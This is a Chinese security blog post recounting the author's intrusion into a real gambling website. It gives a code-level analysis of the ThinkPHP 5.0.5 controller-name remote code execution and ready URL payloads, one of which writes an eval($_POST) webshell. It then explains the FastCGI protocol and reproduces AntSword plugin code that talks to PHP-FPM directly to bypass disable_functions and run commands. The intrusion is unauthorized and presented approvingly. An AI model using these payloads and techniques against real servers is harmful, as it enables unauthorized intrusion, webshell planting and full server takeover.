> 原文链接: https://www.anquanke.com//post/id/193117 


# 利用Thinkphp RCE以及php-fpm绕过disable function拿下菠菜


                                阅读量   
                                **1237445**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">8</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t013481ba716c8bbd36.jpg)](https://p3.ssl.qhimg.com/t013481ba716c8bbd36.jpg)



<a class="reference-link" name="%E5%89%8D%E5%87%A0%E5%A4%A9%E9%81%87%E5%88%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E8%8F%A0%E8%8F%9C%E7%BD%91%E7%AB%99,%E6%9C%AC%E6%97%A8%E7%9D%80%E8%8F%A0%E8%8F%9C%E7%BD%91%E7%AB%99%E9%83%BD%E6%98%AF%E6%AF%92%E7%9A%84%E7%90%86%E5%BF%B5,%E5%AF%B9%E7%9B%AE%E6%A0%87%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E4%BA%86%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B,%E8%AE%B0%E5%BD%95%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%8B"></a>前几天遇到了一个菠菜网站,本旨着菠菜网站都是毒的理念,对目标网站进行了一次渗透过程,记录分享一下

首先日常进行信息收集,这个网站很奇怪,爆破目录之后,除了个别的一些信息泄露,就只剩下登陆注册忘记密码这种了,在常规的万能密码,逻辑漏洞,暴力破解无效之后,我在一次出错的页面捕捉到了网站使用的框架是think PHP5.0.5

** [![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018613a2ce47d75951.png)**

** 瞬间思路就打开了,还记着之前think PHP存在着因为对控制器名没有进行严格过滤导致的任意代码执行漏洞,下面来具体分析一下这种漏洞**



## 漏洞分析

首先thinkphp5改变了入口方式,和tp3有所不同,我们从入口文件`public/index.php`开始一步步进行分析,首先是入口文件

```
// 定义应用目录
define('APP_PATH', __DIR__ . '/../application/');
// 加载框架引导文件
require __DIR__ . '/../thinkphp/start.php';
```

加载框架引导文件,跟进/thinkphp/start.php

```
// ThinkPHP 引导文件
// 1. 加载基础文件
require __DIR__ . '/base.php';

// 2. 执行应用
App::run()-&gt;send();
```

继续跟进run()方法,因为问题主要是发生在路由检测的问题上,所以我们需要找到路由检测的代码

```
// 未设置调度信息则进行 URL 路由检测
            if (empty($dispatch)) `{`
                $dispatch = self::routeCheck($request, $config);
            `}`
```

找到进行路由检测的代码了,继续进行跟踪routeCheck($request, $config)

```
public static function routeCheck($request, array $config)
    `{`
        $path   = $request-&gt;path();
        $depr   = $config['pathinfo_depr'];
        $result = false;

        // 路由检测
        $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config['url_route_on'];
        if ($check) `{`
            // 开启路由
            if (is_file(RUNTIME_PATH . 'route.php')) `{`
                // 读取路由缓存
                $rules = include RUNTIME_PATH . 'route.php';
                is_array($rules) &amp;&amp; Route::rules($rules);
            `}` else `{`
                $files = $config['route_config_file'];
                foreach ($files as $file) `{`
                    if (is_file(CONF_PATH . $file . CONF_EXT)) `{`
                        // 导入路由配置
                        $rules = include CONF_PATH . $file . CONF_EXT;
                        is_array($rules) &amp;&amp; Route::import($rules);
                    `}`
                `}`
            `}`

            // 路由检测（根据路由定义返回不同的URL调度）
            $result = Route::check($request, $path, $depr, $config['url_domain_deploy']);
            $must   = !is_null(self::$routeMust) ? self::$routeMust : $config['url_route_must'];

            if ($must &amp;&amp; false === $result) `{`
                // 路由无效
                throw new RouteNotFoundException();
            `}`
        `}`
```

通过这句话 `$path   = $request-&gt;path();` 我猜测会得到poc的路径<br>
跟进path函数我们验证一下

```
public function path()
    `{`
        if (is_null($this-&gt;path)) `{`
            $suffix   = Config::get('url_html_suffix');
            $pathinfo = $this-&gt;pathinfo();
            if (false === $suffix) `{`
                // 禁止伪静态访问
                $this-&gt;path = $pathinfo;
            `}` elseif ($suffix) `{`
                // 去除正常的URL后缀
                $this-&gt;path = preg_replace('/.(' . ltrim($suffix, '.') . ')$/i', '', $pathinfo);
            `}` else `{`
                // 允许任何后缀访问
                $this-&gt;path = preg_replace('/.' . $this-&gt;ext() . '$/i', '', $pathinfo);
            `}`
        `}`
        return $this-&gt;path;
    `}`
```

根据`$this-&gt;path = $pathinfo;`跟进pathinfo()

```
public function pathinfo()
    `{`
        if (is_null($this-&gt;pathinfo)) `{`
            if (isset($_GET[Config::get('var_pathinfo')])) `{`
                // 判断URL里面是否有兼容模式参数
                $_SERVER['PATH_INFO'] = $_GET[Config::get('var_pathinfo')];
                unset($_GET[Config::get('var_pathinfo')]);
            `}` elseif (IS_CLI) `{`
                // CLI模式下 index.php module/controller/action/params/...
                $_SERVER['PATH_INFO'] = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : '';
            `}`
```

因为var_pathinfo的默认配置为s，我们可利用$_GET[‘s’]来传递路由信息,也就是`?s=`,并且因为ThinkPHP并非强制使用路由，如果没有定义路由，则可以直接使用“模块/控制器/操作”的方式访问,所以,经过组合我们的poc为`?s=模块/控制器/操作`<br>
继续跳回到routeCheck函数.<br>
因为`$result = false;`,我们跟踪到了这里

```
if (false === $result) `{`
            $result = Route::parseUrl($path, $depr, $config['controller_auto_search']);
        `}`
```

跟进`parseUrl()`

```
public static function parseUrl($url, $depr = '/', $autoSearch = false)
    `{`

        if (isset(self::$bind['module'])) `{`
            $bind = str_replace('/', $depr, self::$bind['module']);
            // 如果有模块/控制器绑定
            $url = $bind . ('.' != substr($bind, -1) ? $depr : '') . ltrim($url, $depr);
        `}`
        $url              = str_replace($depr, '|', $url);
        list($path, $var) = self::parseUrlPath($url);
        $route            = [null, null, null];
        if (isset($path)) `{`
            // 解析模块
            $module = Config::get('app_multi_module') ? array_shift($path) : null;
            if ($autoSearch) `{`
                // 自动搜索控制器
                $dir    = APP_PATH . ($module ? $module . DS : '') . Config::get('url_controller_layer');
                $suffix = App::$suffix || Config::get('controller_suffix') ? ucfirst(Config::get('url_controller_layer')) : '';
                $item   = [];
                $find   = false;
                foreach ($path as $val) `{`
                    $item[] = $val;
                    $file   = $dir . DS . str_replace('.', DS, $val) . $suffix . EXT;
                    $file   = pathinfo($file, PATHINFO_DIRNAME) . DS . Loader::parseName(pathinfo($file, PATHINFO_FILENAME), 1) . EXT;
                    if (is_file($file)) `{`
                        $find = true;
                        break;
                    `}` else `{`
                        $dir .= DS . Loader::parseName($val);
                    `}`
                `}`
                if ($find) `{`
                    $controller = implode('.', $item);
                    $path       = array_slice($path, count($item));
                `}` else `{`
                    $controller = array_shift($path);
                `}`
            `}` else `{`
                // 解析控制器
                $controller = !empty($path) ? array_shift($path) : null;
            `}`
            // 解析操作
            $action = !empty($path) ? array_shift($path) : null;
            // 解析额外参数
            self::parseUrlParams(empty($path) ? '' : implode('|', $path));
            // 封装路由
            $route = [$module, $controller, $action];
            // 检查地址是否被定义过路由
            $name  = strtolower($module . '/' . Loader::parseName($controller, 1) . '/' . $action);
            $name2 = '';
            if (empty($module) || isset($bind) &amp;&amp; $module == $bind) `{`
                $name2 = strtolower(Loader::parseName($controller, 1) . '/' . $action);
            `}`

            if (isset(self::$rules['name'][$name]) || isset(self::$rules['name'][$name2])) `{`
                throw new HttpException(404, 'invalid request:' . str_replace('|', $depr, $url));
            `}`
        `}`
        return ['type' =&gt; 'module', 'module' =&gt; $route];
    `}`
```

其中`$url= str_replace($depr, '|', $url);`是很重要的,它把$url中的符号’/‘替换为’|’也就是`模块|控制器|操作`<br>
然后通过`list($path,$var)=self::parseUrlPath($url);`<br>
跟进`parseUrlPath($url)`

```
private static function parseUrlPath($url)
    `{`
        // 分隔符替换 确保路由定义使用统一的分隔符
        $url = str_replace('|', '/', $url);
        $url = trim($url, '/');
        $var = [];
        if (false !== strpos($url, '?')) `{`
            // [模块/控制器/操作?]参数1=值1&amp;参数2=值2...
            $info = parse_url($url);
            $path = explode('/', $info['path']);
            parse_str($info['query'], $var);
        `}` elseif (strpos($url, '/')) `{`
            // [模块/控制器/操作]
            $path = explode('/', $url);
        `}` else `{`
            $path = [$url];
        `}`
        return [$path, $var];
    `}`
```

`$path = explode('/', $url);`它会将变量$url变为数组，此时$path数组的值为如下

```
$path=array[3]
$path[0]=模块
$path[1]=控制器
$path[2]=操作
```

然后返回到parseUrl()函数，继续往下跟，跟到解析控制器部分<br>`$controller = !empty($path) ? array_shift($path) : null;`<br>
会得到控制器部分<br>`$action = !empty($path) ? array_shift($path) : null;`<br>
会得到操作<br>
至于模块

```
// 默认模块名
'default_module'         =&gt; 'index',
```

然后会封装路由，数组变量$route为

```
$route=array[3]
$route[0]=模块(index)
$route[1]=控制器
$route[2]=操作
```

最后一行代码return后会以数组的形式返回到routeCheck()<br>
这里数组有所改变

```
array[2]:
 array['type']=moudle
 array['moudle']=array[3]
```

返回routeback()

```
public static function routeCheck($request, array $config)
    `{`
        $path   = $request-&gt;path();
        $depr   = $config['pathinfo_depr'];
        $result = false;
        // 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索
        if (false === $result) `{`
            $result = Route::parseUrl($path, $depr, $config['controller_auto_search']);
        `}`

        return $result;
    `}`
```

也就是上述代码中数组变量$result接受返回的数据，然后再将数组变量$result结果返回到run()

```
// 未设置调度信息则进行 URL 路由检测
            if (empty($dispatch)) `{`
                $dispatch = self::routeCheck($request, $config);
            `}`

            // 记录当前调度信息
            $request-&gt;dispatch($dispatch);

            // 记录路由和请求信息
            if (self::$debug) `{`
                Log::record('[ ROUTE ] ' . var_export($dispatch, true), 'info');
                Log::record('[ HEADER ] ' . var_export($request-&gt;header(), true), 'info');
                Log::record('[ PARAM ] ' . var_export($request-&gt;param(), true), 'info');
            `}`

            // 监听 app_begin
            Hook::listen('app_begin', $dispatch);

            // 请求缓存检查
            $request-&gt;cache(
                $config['request_cache'],
                $config['request_cache_expire'],
                $config['request_cache_except']
            );

            $data = self::exec($dispatch, $config);
        `}` catch (HttpResponseException $exception) `{`
            $data = $exception-&gt;getResponse();
        `}`
```

$dispatch获取到值,开始追踪$dispatch到`$data = self::exec($dispatch, $config);`通过这行代码开始追踪exec()

```
protected static function exec($dispatch, $config)
    `{`
        switch ($dispatch['type']) `{`
            case 'redirect': // 重定向跳转
                $data = Response::create($dispatch['url'], 'redirect')
                    -&gt;code($dispatch['status']);
                break;
            case 'module': // 模块/控制器/操作
                $data = self::module(
                    $dispatch['module'],
                    $config,
                    isset($dispatch['convert']) ? $dispatch['convert'] : null
                );
                break;
            case 'controller': // 执行控制器操作
                $vars = array_merge(Request::instance()-&gt;param(), $dispatch['var']);
                $data = Loader::action(
                    $dispatch['controller'],
                    $vars,
                    $config['url_controller_layer'],
                    $config['controller_suffix']
                );
                break;
            case 'method': // 回调方法
                $vars = array_merge(Request::instance()-&gt;param(), $dispatch['var']);
                $data = self::invokeMethod($dispatch['method'], $vars);
                break;
            case 'function': // 闭包
                $data = self::invokeFunction($dispatch['function']);
                break;
            case 'response': // Response 实例
                $data = $dispatch['response'];
                break;
            default:
                throw new InvalidArgumentException('dispatch type not support');
        `}`

        return $data;
    `}`
```

因为$dispatch[‘type’]为module，所以跳到`case 'module': // 模块/控制器/操作`跟进module函数

```
public static function module($result, $config, $convert = null)
    `{`
        if (is_string($result)) `{`
            $result = explode('/', $result);
        `}`

        $request = Request::instance();
```

这里的$result函数为

```
$result=array[3]
result[0]=模块(index)
result[1]=控制器
result[2]=操作
```

继续跟进module函数,出现问题了

```
// 获取控制器名
        $controller = strip_tags($result[1] ?: $config['default_controller']);
        $controller = $convert ? strtolower($controller) : $controller;

        // 获取操作名
        $actionName = strip_tags($result[2] ?: $config['default_action']);
        if (!empty($config['action_convert'])) `{`
            $actionName = Loader::parseName($actionName, 1);
        `}` else `{`
            $actionName = $convert ? strtolower($actionName) : $actionName;
        `}`
```

就在这里,没有对控制器做出一个足够的检测,就获取控制器名了,导致可以任意调用,我们就可以使用反射执行类的方法,进行任意函数执行,现在poc也就变成了`?s=index/thinkapp/invokefunction`然后继续跟进

```
// 设置当前请求的控制器、操作
        $request-&gt;controller(Loader::parseName($controller, 1))-&gt;action($actionName);
```

这里把操作名变量$actionName为invokefunction,继续往下跟module函数

```
// 获取当前操作名
        $action = $actionName . $config['action_suffix'];

        $vars = [];
        if (is_callable([$instance, $action])) `{`
            // 执行操作方法
            $call = [$instance, $action];
            // 严格获取当前操作方法名
            $reflect    = new ReflectionMethod($instance, $action);
            $methodName = $reflect-&gt;getName();
            $suffix     = $config['action_suffix'];
            $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName;
            $request-&gt;action($actionName);

        `}` elseif (is_callable([$instance, '_empty'])) `{`
            // 空操作
            $call = [$instance, '_empty'];
            $vars = [$actionName];
        `}` else `{`
            // 操作不存在
            throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()');
        `}`

        Hook::listen('action_begin', $call);

        return self::invokeMethod($call, $vars);
```

is_callable因验证thinkapp中存在invokefunction方法，所以会进入到这个if语句，然后获取类名和方法名.最后一行return到invokeMethod,继续跟进

```
public static function invokeMethod($method, $vars = [])
    `{`
        if (is_array($method)) `{`
            $class   = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]);
            $reflect = new ReflectionMethod($class, $method[1]);
        `}` else `{`
            // 静态方法
            $reflect = new ReflectionMethod($method);
        `}`

        $args = self::bindParams($reflect, $vars);

        self::$debug &amp;&amp; Log::record('[ RUN ] ' . $reflect-&gt;class . '-&gt;' . $reflect-&gt;name . '[ ' . $reflect-&gt;getFileName() . ' ]', 'info');

        return $reflect-&gt;invokeArgs(isset($class) ? $class : null, $args);
    `}`
```

`$args = self::bindParams($reflect, $vars);`数组变量$args会获取POC中的余下的参数,参数中我们就可以使用call_user_func_array来调用函数了.最后组合的poc为

```
?s=/index/thinkapp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell1.php&amp;vars[1][]=&lt;?phpinfo();?&gt;
```

最后的return会调用invokeArgs函数，此函数的作用是使用数组方法给函数传递参数，并执行函数，所以最终执行call_user_func_array函数。此时会返回到exec函数,retuen $data,将$data传到run()函数中,此时命令就已经执行成功了.

[![](https://p4.ssl.qhimg.com/t019f71a869837dd79e.png)](https://p4.ssl.qhimg.com/t019f71a869837dd79e.png)

既然已经可以进行上传getshell了,那当然直接传个小马进去

```
?s=/index/thinkapp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell2.php&amp;vars[1][]=&lt;?php eval($_POST[xm])?&gt;i
```

[![](https://p2.ssl.qhimg.com/t016aa952b47d5704c0.png)](https://p2.ssl.qhimg.com/t016aa952b47d5704c0.png)

但是问题来了,虽然是直接getshell了,但是没有办法去进行命令执行,然后跑去phpinfo看一下disable_function

[![](https://p4.ssl.qhimg.com/t015886b12220cf9de3.png)](https://p4.ssl.qhimg.com/t015886b12220cf9de3.png)

果然给禁止了,那接下来就是想办法绕过disable_function了,绕过办法有好多,但是看目标开启了FPM功能,那自然是用fpm来绕过disable_function

[![](https://p5.ssl.qhimg.com/t018a665b4b8d94cf5e.png)](https://p5.ssl.qhimg.com/t018a665b4b8d94cf5e.png)



## php-fpm来绕过disable function

### <a class="reference-link" name="php-cgi"></a>php-cgi

既然是利用PHP-FPM，我们首先需要了解一下什么是PHP-FPM，研究过apache或者nginx的人都知道，早期的websherver负责处理全部请求，其接收到请求，读取文件，传输过去.换句话说,早期的webserver只处理html等静态web.

但是呢,随着技术发展,出现了像php等动态语言来丰富web,形成动态web,这就糟了,webserver处理不了了，怎么办呢？那就交给php解释器来处理吧！交给php解释器处理很好，但是，php解释器如何与webserver进行通信呢？为了解决不同的语言解释器(如php、python解释器)与webserver的通信，于是出现了cgi协议。只要你按照cgi协议去编写程序，就能实现语言解释器与webwerver的通信。如php-cgi程序。

### <a class="reference-link" name="fast-cgi"></a>fast-cgi

有了cgi,自然就解决了webserver与php解释器的通信问题,但是webserver有一个问题,就是它每收到一个请求，都会去fork一个cgi进程，请求结束再kill掉这个进程.这样会很浪费资源,于是，出现了cgi的改良版本，fast-cgi。fast-cgi每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求.这样就会大大的提高效率.

### <a class="reference-link" name="fast-cgi%20record"></a>fast-cgi record

其实说白了,cgi协议就和HTTP协议相同,是进行数据交换/通信的一个协议,类比HTTP协议来说,cgi协议是webserver和解释器进行数据交换的协议,它由多条record组成,每一条record都和http一样,由header和body组成,webserver将这二者按照cgi规则封装好发送给解释器,解释器解码之后拿到具体数据进行操作,得到结果之后再次封装好返回给webserver.<br>
其中使用cgi协议封装之后的请求是这样子的

```
typedef struct 
`{`
HEAD
    unsigned char version;              //版本
    unsigned char type;                 //类型
    unsigned char requestIdB1;          //id
    unsigned char requestIdB0;          
    unsigned char contentLengthB1;      //body大小
    unsigned char contentLengthB0;
    unsigned char paddingLength;        //额外大小
    unsigned char reserved;       
BODY
   unsigned char contentData[contentLength];//主要内容
   unsigned char paddingData[paddingLength];//额外内容
`}`FCGI_Record;
```

解释器在解析了fastcgi头以后，拿到contentLength，然后再在TCP流里读取大小等于contentLength的数据,这就是contentData,也就是主要内容,后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定,不需要的时候,指定为 0 即可.

其中发送类型很重要,具体的发送类型如下:

<th style="text-align: center;">type值</th><th style="text-align: center;">具体含义</th>
|------
<td style="text-align: center;">1</td><td style="text-align: center;">在与php-fpm建立连接之后发送的第一个消息中的type值就得为1, 用来表明此消息为请求开始的第一个消息</td>
<td style="text-align: center;">2</td><td style="text-align: center;">异常断开与php-fpm的交互</td>
<td style="text-align: center;">3</td><td style="text-align: center;">在与php-fpm交互中所发的最后一个消息中type值为此，以表明交互的正常结束</td>
<td style="text-align: center;">4</td><td style="text-align: center;">在交互过程中给php-fpm传递环境参数时，将type设为此， 以表明消息中包含的数据为某个name-value对</td>
<td style="text-align: center;">5</td><td style="text-align: center;">web服务器将从浏览器接收到的POST请求数据(表单提交等)以消息的形式发给php-fpm,这种消息的type就得设为5</td>
<td style="text-align: center;">6</td><td style="text-align: center;">php-fpm给web服务器回的正常响应消息的type就设为6</td>
<td style="text-align: center;">7</td><td style="text-align: center;">php-fpm给web服务器回的错误响应设为7</td>

看完这个基本就会清楚了,webserver和解释器进行通信,第一个record就是type=1,然后发送type为4,5,6,7的record,结束时发送type为2,3的record.

### <a class="reference-link" name="php-fpm"></a>php-fpm

前面说了那么多,那php-fpm是什莫东西呢?

其实FPM就是fast-cgi的协议解析器,webserver使用cgi协议封装好用户的请求发送给谁呢? 其实就是发送给FPM

FPM按照cgi的协议将TCP流解析成真正的数据.

例如:

我们搭建一个LNMP的服务器,然后创建一个name.php,然后功能是接收并且echo Get类型请求参数,我们的name.php在`/var/www/html`内,这时我们发送一个请求/name.php?name=alex,此时,Nginx会将这个请求变成如下key-value对：

```
`{`
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/name.php',
    'SCRIPT_NAME': '/name.php',
    'QUERY_STRING': '?name=alex',
    'REQUEST_URI': '/name.php?name=alex',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '6666',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
`}`
```

如果有熟悉php开发的小伙伴就会知道,这个是PHP中`$_SERVER`中的一部分,FPM在拿到经过封装的数据包之后,进行解析,然后，执行`SCRIPT_FILENAME`指向的php文件.

### <a class="reference-link" name="%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"></a>攻击方式

这里由于FPM默认监听的是9000端口,我们就可以绕过webserver,直接构造fastcgi协议，和fpm进行通信.于是就有了利用 webshell 直接与 FPM通信 来绕过 disable functions.

因为前面我们了解了协议原理和内容,接下来就是使用cgi协议封装请求,通过socket来直接与FPM通信.

但是能够构造fastcgi，就能执行任意PHP代码吗?答案是肯定的,但是前提是我们需要突破几个限制.
<li>
**第一个问题**<br>
既然是请求,那么`SCRIPT_FILENAME`就相当的重要,因为前面说过,fpm是根据这个值来执行php文件文件的,如果不存在,会直接返回404,所以想要利用好这个漏洞,就得找到一个已经存在的php文件,好在一般进行源安装php的时候,服务器都会附带上一些php文件,如果说我们没有收集到目标web目录的信息的话,可以试试这种办法.</li>
<li>
**第二个问题**<br>
我们再如何构造fastcgi和控制`SCRIPT_FILENAME`,都无法做到任意命令执行,因为只能执行目标服务器上的php文件.<br>
那要如何绕过这种限制呢? 我们可以从`php.ini`入手.它有两个特殊选项,能够让我们去做到任意命令执行,那就是`auto_prepend_file`.<br>`auto_prepend_file`的功能是在在执行目标文件之前，先包含它指定的文件,这样的话,就可以用它来指定`php://input`进行远程文件包含了.这样就可以做到任意命令执行了.</li>
<li>
**第三个问题**<br>
进行过远程文件包含的小伙伴都知道,远程文件包含有`allow_url_include`这个限制因素的,如果没有为`ON`的话就没有办法进行远程文件包含,那要怎末设置呢?<br>
这里,FPM是有设置PHP配置项的KEY-VALUE的,`PHP_VALUE`可以用来设置php.ini,`PHP_ADMIN_VALUE`则可以设置所有选项.这样就解决问题了.</li>
最后构造的请求如下

```
`{`
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/name.php',
    'SCRIPT_NAME': '/name.php',
    'QUERY_STRING': '?name=alex',
    'REQUEST_URI': '/name.php?name=alex',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '6666',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
    'PHP_VALUE': 'auto_prepend_file = php://input',
    'PHP_ADMIN_VALUE': 'allow_url_include = On'
`}`
```

这里附上P神的[EXP](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75)

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%20webshell%20%E7%9B%B4%E6%8E%A5%E4%B8%8E%20FPM%E9%80%9A%E4%BF%A1%20%E6%9D%A5%E7%BB%95%E8%BF%87%20disable%20functions"></a>利用 webshell 直接与 FPM通信 来绕过 disable functions

这里就得益于蚁剑的插件了,实现了webshell绕过disable funcrion

使用完插件是上传了`.antproxy.php`和.so库,下面分析一下怎末实现的

其实前面讲完原理之后就特别好分析,`.antproxy.php`其实就是一个代理,关键代码为

```
$headers=get_client_header();
$host = "127.0.0.1";
$port = 60802;
$errno = '';
$errstr = '';
$timeout = 30;
```

这里结合上下代码就能知道,webshell向60802发送了payload

,通过`ps -aux | grep          60802`查看发现是重新启用了一个php服务,然后使用了`-n`也就是不使用`php.ini`,从而绕过了disdisable functions

```
exploit() `{`
    let self = this;
    let fpm_host = '';
    let fpm_port = -1;
    let port = Math.floor(Math.random() * 5000) + 60000; // 60000~65000
    if (self.form.validate()) `{`
      self.cell.progressOn();
      let core = self.top.core;
      let formvals = self.form.getValues();
      let phpbinary = formvals['phpbinary'];
      formvals['fpm_addr'] = formvals['fpm_addr'].toLowerCase();
      if (formvals['fpm_addr'].startsWith('unix:')) `{`
        fpm_host = formvals['fpm_addr'];
      `}` else if (formvals['fpm_addr'].startsWith('/')) `{`
        fpm_host = `unix://$`{`formvals['fpm_addr']`}``
      `}` else `{`
        fpm_host = formvals['fpm_addr'].split(':')[0] || '';
        fpm_port = parseInt(formvals['fpm_addr'].split(':')[1]) || 0;
      `}`
      // 生成 ext
      let wdir = "";
      if (self.isOpenBasedir) `{`
        for (var v in self.top.infodata.open_basedir) `{`
          if (self.top.infodata.open_basedir[v] == 1) `{`
            if (v == self.top.infodata.phpself) `{`
              wdir = v;
            `}` else `{`
              wdir = v;
            `}`
            break;
          `}`
        `}`;
      `}` else `{`
        wdir = self.top.infodata.temp_dir;
      `}`
      let cmd = `$`{`phpbinary`}` -n -S 127.0.0.1:$`{`port`}` -t $`{`self.top.infodata.phpself`}``;
      let fileBuffer = self.generateExt(cmd);
      if (!fileBuffer) `{`
        toastr.warning(PHP_FPM_LANG['msg']['genext_err'], LANG_T["warning"]);
        self.cell.progressOff();
        return
      `}`

      new Promise((res, rej) =&gt; `{`
        var ext_path = `$`{`wdir`}`/.$`{`String(Math.random()).substr(2, 5)`}`$`{`self.ext_name`}``;
        // 上传 ext
        core.request(
          core.filemanager.upload_file(`{`
            path: ext_path,
            content: fileBuffer
          `}`)
        ).then((response) =&gt; `{`
          var ret = response['text'];
          if (ret === '1') `{`
            toastr.success(`Upload extension $`{`ext_path`}` success.`, LANG_T['success']);
            res(ext_path);
          `}` else `{`
            rej("upload extension fail");
          `}`
        `}`).catch((err) =&gt; `{`
          rej(err)
        `}`);
      `}`).then((p) =&gt; `{`
        // 触发 payload, 会超时
        var payload = `$`{`FastCgiClient()`}`;
          $content="";
          $client = new Client('$`{`fpm_host`}`',$`{`fpm_port`}`);
          $client-&gt;request(array(
            'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0',
            'REQUEST_METHOD' =&gt; 'POST',
            'SERVER_SOFTWARE' =&gt; 'php/fcgiclient',
            'REMOTE_ADDR' =&gt; '127.0.0.1',
            'REMOTE_PORT' =&gt; '9984',
            'SERVER_ADDR' =&gt; '127.0.0.1',
            'SERVER_PORT' =&gt; '80',
            'SERVER_NAME' =&gt; 'mag-tured',
            'SERVER_PROTOCOL' =&gt; 'HTTP/1.1',
            'CONTENT_TYPE' =&gt; 'application/x-www-form-urlencoded',
            'PHP_VALUE' =&gt; 'extension=$`{`p`}`',
            'PHP_ADMIN_VALUE' =&gt; 'extension=$`{`p`}`',
            'CONTENT_LENGTH' =&gt; strlen($content)
            ),
            $content
          );
          sleep(1);
          echo(1);
        `;
        core.request(`{`
          _: payload,
        `}`).then((response) =&gt; `{`

        `}`).catch((err) =&gt; `{`
          // 超时也是正常
        `}`)
      `}`).then(() =&gt; `{`
        // 验证是否成功开启
        var payload = `sleep(1);
          $fp = @fsockopen("127.0.0.1", $`{`port`}`, $errno, $errstr, 1);
          if(!$fp)`{`
            echo(0);
          `}`else`{`
            echo(1);
            @fclose($fp);
          `}`;`
        core.request(`{`
          _: payload,
        `}`).then((response) =&gt; `{`
          var ret = response['text'];
          if (ret === '1') `{`
            toastr.success(LANG['success'], LANG_T['success']);
            self.uploadProxyScript("127.0.0.1", port);
            self.cell.progressOff();
          `}` else `{`
            self.cell.progressOff();
            throw ("exploit fail");
          `}`
        `}`).catch((err) =&gt; `{`
          self.cell.progressOff();
          toastr.error(`$`{`LANG['error']`}`: $`{`JSON.stringify(err)`}``, LANG_T['error']);
        `}`)
      `}`).catch((err) =&gt; `{`
        self.cell.progressOff();
        toastr.error(`$`{`LANG['error']`}`: $`{`JSON.stringify(err)`}``, LANG_T['error']);
      `}`);
    `}` else `{`
      self.cell.progressOff();
      toastr.warning(LANG['form_not_comp'], LANG_T["warning"]);
    `}`
    return;
  `}`
`}`
```

上述代码就是一次攻击过程了,首先验证FPM是否可行,然后生成并且上传扩展,然后开始构造fastcgi封装请求来加载扩展,触发payload后,生成新的php server,每次执行命令的时候都会转发到60802进行执行.

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d567e43de365a44c.png)

命令执行成功



## 结语

这样一次渗透测试就结束了,后来发现,大多数的菠菜网站都是这类的架构和糟糕的服务器管理方式,学习渗透测试还是原理和实战相结合最好,不懂原理的渗透测试永远是没有灵魂的.

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017ba288b61531446c.png)
